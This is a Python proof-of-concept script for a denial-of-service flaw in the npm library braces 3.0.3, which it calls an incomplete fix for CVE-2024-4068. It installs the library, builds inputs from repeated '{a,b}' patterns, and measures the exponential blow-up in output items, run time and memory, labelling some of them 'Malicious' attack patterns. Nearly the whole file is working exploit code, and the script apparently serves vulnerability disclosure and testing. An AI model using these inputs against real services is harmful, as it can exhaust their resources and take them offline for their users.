#!/usr/bin/env python3
"""
PoC: braces 3.0.3 Denial of Service via Comma-Separated Brace Expansion
CVE-CANDIDATE: CVE-2024-4068 incomplete fix
CWE: CWE-400 (Uncontrolled Resource Consumption)
CVSS: 7.5 HIGH
Tested version: braces@3.0.3 (latest)

Prerequisites:
    npm install braces@3.0.3
"""

import subprocess
import time
import sys
import os
import json

# Auto-install braces@3.0.3 if not present
def ensure_braces_installed():
    try:
        result = subprocess.run(
            ['node', '-e', 'require("braces"); console.log(require("braces/package.json").version)'],
            capture_output=True, text=True, timeout=10
        )
        version = result.stdout.strip()
        if version == "3.0.3":
            print(f"[*] braces@{version} found")
            return True
        else:
            print(f"[!] braces@{version} found, but 3.0.3 is required")
            return False
    except:
        pass

    print("[*] Installing braces@3.0.3...")
    result = subprocess.run(
        ['npm', 'install', 'braces@3.0.3', '--no-save'],
        capture_output=True, text=True, timeout=60
    )
    if result.returncode != 0:
        print(f"[!] Failed to install: {result.stderr}")
        sys.exit(1)
    print("[*] braces@3.0.3 installed")
    return True

def run_node(code, timeout=30):
    """Run Node.js code and return output"""
    try:
        result = subprocess.run(
            ['node', '-e', code],
            capture_output=True, text=True, timeout=timeout
        )
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return None, "TIMEOUT", -1

def test_threshold():
    """Find the exact DoS threshold"""
    print("[*] Finding DoS threshold...")
    print()

    for n in [10, 15, 18, 20, 22, 25]:
        code = f"""
        const braces = require('braces');
        const input = '{{a,b}}'.repeat({n});
        const start = Date.now();
        const memBefore = process.memoryUsage().heapUsed;
        try {{
            const result = braces.expand(input);
            const elapsed = Date.now() - start;
            const memAfter = process.memoryUsage().heapUsed;
            console.log(JSON.stringify({{
                n: {n},
                inputLen: input.length,
                outputItems: result.length,
                outputChars: result.join(',').length,
                timeMs: elapsed,
                memDeltaKB: Math.round((memAfter - memBefore) / 1024)
            }}));
        }} catch(e) {{
            console.log(JSON.stringify({{n: {n}, error: e.message.substring(0, 80)}}));
        }}
        """
        stdout, stderr, rc = run_node(code, timeout=45)
        if stdout:
            try:
                data = json.loads(stdout.strip())
                if 'error' in data:
                    print(f"  n={data['n']:2d}: input={data['n']*5:5d} chars -> ERROR: {data['error']}")
                else:
                    print(f"  n={data['n']:2d}: input={data['inputLen']:5d} chars -> {data['outputItems']:>10,} items, "
                          f"{data['outputChars']:>10,} chars, {data['timeMs']:>6d}ms, +{data['memDeltaKB']}KB")
            except json.JSONDecodeError:
                print(f"  n={n:2d}: parse error")
        else:
            print(f"  n={n:2d}: TIMEOUT (>{45}s)")
            break

    print()

def test_real_world():
    """Test with realistic input patterns"""
    print("[*] Testing realistic attack patterns...")
    print()

    patterns = [
        ("Malicious x25", "{a,b}" * 25),
        ("Malicious x20", "{a,b}" * 20),
        ("Malicious x15", "{a,b}" * 15),
    ]

    code = f"""
    const braces = require('braces');
    const patterns = {json.dumps(patterns)};
    const results = [];
    for (const [name, input] of patterns) {{
        const start = Date.now();
        try {{
            const result = braces.expand(input);
            results.push({{name, inputLen: input.length, outputItems: result.length, timeMs: Date.now() - start}});
        }} catch(e) {{
            results.push({{name, error: e.message.substring(0, 60)}});
        }}
    }}
    console.log(JSON.stringify(results));
    """

    stdout, stderr, rc = run_node(code, timeout=60)
    if stdout:
        results = json.loads(stdout.strip())
        for r in results:
            if 'error' in r:
                print(f"  {r['name']:20s}: ERROR: {r['error']}")
            else:
                print(f"  {r['name']:20s}: {r['inputLen']:5d} chars -> {r['outputItems']:>10,} items in {r['timeMs']:>6d}ms")
    print()

if __name__ == '__main__':
    print("=" * 70)
    print("PoC: braces 3.0.3 Denial of Service")
    print("CVE-CANDIDATE: CVE-2024-4068 incomplete fix")
    print("=" * 70)
    print()

    if not ensure_braces_installed():
        print("[!] Cannot proceed without braces@3.0.3")
        sys.exit(1)
    print()

    test_threshold()
    test_real_world()

    print("=" * 70)
    print("[!] CONCLUSION: braces 3.0.3 is vulnerable to DoS via")
    print("    comma-separated brace expansion. The CVE-2024-4068 fix")
    print("    only limited input length, not combinatorial output.")
    print("=" * 70)
